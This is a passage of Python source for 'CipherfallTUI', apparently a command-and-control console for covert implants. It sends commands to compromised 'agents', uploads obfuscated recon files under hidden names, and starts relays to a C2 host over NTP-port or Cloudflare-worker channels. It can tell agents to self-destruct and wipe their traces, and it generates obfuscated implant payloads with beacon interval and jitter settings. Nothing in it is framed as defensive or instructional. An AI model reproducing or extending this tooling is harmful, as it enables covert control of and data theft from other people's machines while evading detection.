                        new_name = r.stdout.strip().split("→")[-1].strip()
                        tmp = tmpdir / new_name
                data  = tmp.read_bytes()
                b64   = base64.b64encode(data).decode()
                rname = f"/tmp/{tmp.name}" if do_renamer else f"/tmp/.{uuid.uuid4().hex[:8]}"
                cmd   = f"WRITE:{rname}:{b64}"
                flags = (["delayer"] if do_delayer else []) + (["obfuscate"] if do_obfuscate else []) + (["renamer"] if do_renamer else [])
                log.write(f"[green]recon ready ({'|'.join(flags) or 'raw'}) → {len(data)} bytes — uploading…[/green]")
                _recon_remote = rname
                _recon_aid    = self._selected_agent
            finally:
                shutil.rmtree(tmpdir, ignore_errors=True)
        elif cmd.startswith("/module relay"):
            parts  = cmd.split()
            a_data = self._agents_data.get(self._selected_agent or "", {})
            info   = json.loads(a_data.get("sysinfo") or "{}")
            wurl   = info.get("worker_url", "")
            is_nr  = not wurl.startswith("ntp://")  # NullRelay uses HTTPS worker URL
            if is_nr:
                # NullRelay: /module relay start [port] — no target needed
                if len(parts) <= 2 or (len(parts) == 3 and parts[2] == "start"):
                    cmd = "/module relay start 443"
                elif len(parts) == 4 and parts[2] == "start":
                    cmd = f"/module relay start {parts[3]}"
            else:
                # ClockVenom NTP: /module relay start [port] [host:port]
                if len(parts) <= 2 or (len(parts) == 3 and parts[2] == "start"):
                    cmd = f"/module relay start 123 {_C2_HOST}:443"
                elif len(parts) == 4 and parts[2] == "start":
                    cmd = f"/module relay start {parts[3]} {_C2_HOST}:443"
        elif cmd == "/module suicide":
            agent_id = self._selected_agent
            if not agent_id:
                return
            a_data = self._agents_data.get(agent_id, {})
            label  = a_data.get("label") or agent_id[:8]

            async def on_suicide_confirm(confirmed: bool) -> None:
                if not confirmed:
                    return
                base_url = self._agent_base.get(agent_id, BASE)
                try:
                    async with httpx.AsyncClient() as c:
                        r = await c.post(
                            f"{base_url}/admin/task",
                            json={"agent_id": agent_id, "command": "/module suicide"},
                            timeout=3,
                        )
                        result = r.json()
                    self._suicide_tasks[result["task_id"]] = agent_id
                    self._selected_task = result["task_id"]
                    self.query_one("#output-log", RichLog).write(
                        "[yellow]suicide dispatched — agent will self-destruct…[/yellow]"
                    )
                    await self._load_tasks(agent_id)
                except Exception as e:
                    self.query_one("#output-log", RichLog).write(f"[red]error: {e}[/red]")

            self.push_screen(ConfirmModal(f"Suicide  {label}?  [wipe agent + traces]"), on_suicide_confirm)
            return
        base = self._agent_base.get(self._selected_agent or "", BASE)
        try:
            async with httpx.AsyncClient() as c:
                r = await c.post(
                    f"{base}/admin/task",
                    json={"agent_id": self._selected_agent, "command": cmd},
                    timeout=3,
                )
                result = r.json()
        except Exception as e:
            self.query_one("#output-log", RichLog).write(f"[red]error: {e}[/red]")
            return

        self._selected_task = result["task_id"]
        if _recon_remote:
            self._recon_tasks[result["task_id"]] = {
                "type":        "recon_write",
                "agent_id":    _recon_aid,
                "remote_path": _recon_remote,
            }
        if _download_local:
            tid = result["task_id"]
            if _is_ntp:
                self._download_sessions[tid] = {
                    "remote_path": _download_remote,
                    "local_path":  _download_local,
                    "agent_id":    self._selected_agent,
                    "total":       0,
                    "chunks":      {},
                    "chunk_tasks": {},
                    "queued":      False,
                    "done":        False,
                }
                self._download_tasks[tid] = {"type": "count", "session_id": tid}
            else:
                self._download_tasks[tid] = {
                    "type":        "direct",
                    "remote_path": _download_remote,
                    "local_path":  _download_local,
                }
        log.clear()
        log.write(f"[yellow]queued  →  task {result['task_id'][:8]}[/yellow]")
        await self._load_tasks(self._selected_agent)

    def on_select_changed(self, event: Select.Changed) -> None:
        if event.select.id != "p-type":
            return
        is_cf = event.value == "cloudflare"
        is_relay_on = self.query_one("#p-relay", Switch).value
        self.query_one("#row-url").display        = is_cf
        self.query_one("#row-relay").display      = True
        self.query_one("#row-relay-host").display = not is_cf and is_relay_on
        self.query_one("#row-relay-port").display = is_relay_on

    def on_switch_changed(self, event: Switch.Changed) -> None:
        if event.switch.id != "p-relay":
            return
        is_cf = self.query_one("#p-type", Select).value == "cloudflare"
        self.query_one("#row-relay-host").display = event.value and not is_cf
        self.query_one("#row-relay-port").display = event.value

    async def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id != "btn-generate":
            return

        status = self.query_one("#payload-status", Static)
        status.update("[yellow]generating…[/yellow]")

        agent_type  = self.query_one("#p-type",       Select).value
        worker_url  = self.query_one("#p-url",        Input).value.strip().rstrip("/")
        psk         = self.query_one("#p-psk",        Input).value.strip()
        interval    = int(self.query_one("#p-int",    Input).value.strip() or "30")
        jitter      = int(self.query_one("#p-jitter", Input).value.strip() or "10")
        relay_mode  = self.query_one("#p-relay",       Switch).value
        relay_host  = self.query_one("#p-relay-host", Input).value.strip()
        relay_port  = int(self.query_one("#p-relay-port", Input).value.strip() or "8443")
        obfuscate   = self.query_one("#p-obf",        Switch).value
        out_name    = self.query_one("#p-out",        Input).value.strip() or "agent_payload.py"

        try:
            if agent_type == "ntp":
                tcp_port = relay_port if relay_mode else 443
                host     = relay_host if relay_mode else ""
                out = await asyncio.to_thread(
                    _bake_agent_ntp, psk, interval, jitter, out_name, tcp_port, host
                )
            else:
                out = await asyncio.to_thread(
                    _bake_agent_cloudflare, worker_url, psk, interval, jitter, out_name,
                    relay_port if relay_mode else 0,
                )
            if obfuscate:
                out = await asyncio.to_thread(_obfuscate, out)
            if agent_type == "ntp" and relay_mode:
                relay_tag = f" [via {relay_host}:{relay_port}]"
            elif agent_type == "cloudflare" and relay_mode:
                relay_tag = f" [relay :{relay_port}]"
            else:
                relay_tag = ""
            status.update(f"[green]✓  {agent_type} agent{relay_tag} → {out.name}[/green]")
        except Exception as e:
            status.update(f"[red]error: {e}[/red]")

    def action_do_refresh(self) -> None:
        asyncio.ensure_future(self._load_agents())

    def action_delete_agent(self) -> None:
        if not self._selected_agent:
            return
        agent_id = self._selected_agent
        agent    = self._agents_data.get(agent_id, {})
        label    = agent.get("label") or agent_id[:8]
        info     = json.loads(agent.get("sysinfo") or "{}")
        bi       = info.get("beacon_int", 30)
        alive    = int(time.time()) - agent.get("last_seen", 0) < max(bi * 5, 30)
        suffix   = "  [kill remote process + remove]" if alive else "  [remove from DB]"
        base     = self._agent_base.get(agent_id, BASE)

        async def on_confirm(confirmed: bool) -> None:
            if not confirmed:
                return
            if alive:
                try:
                    async with httpx.AsyncClient() as c:
                        await c.post(
                            f"{base}/admin/task",
                            json={"agent_id": agent_id, "command": "kill $PPID"},
                            timeout=3,
                        )
                    await asyncio.sleep(1.5)
                except Exception:
                    pass
            try:
                async with httpx.AsyncClient() as c:
                    await c.delete(f"{base}/admin/agents/{agent_id}", timeout=3)
            except Exception:
                pass
            if self._selected_agent == agent_id:
                self._selected_agent = None
                self._selected_task  = None
                self.query_one("#cmd-input", Input).placeholder = "select an agent first"
                self.query_one("#output-log", RichLog).clear()
            self.query_one("#tasks-table", DataTable).clear()
            self.query_one("#agents-table", DataTable).clear()
            await self._load_agents()

        self.push_screen(ConfirmModal(f"Delete agent  {label}{suffix}?"), on_confirm)


if __name__ == "__main__":
    CipherfallTUI().run()
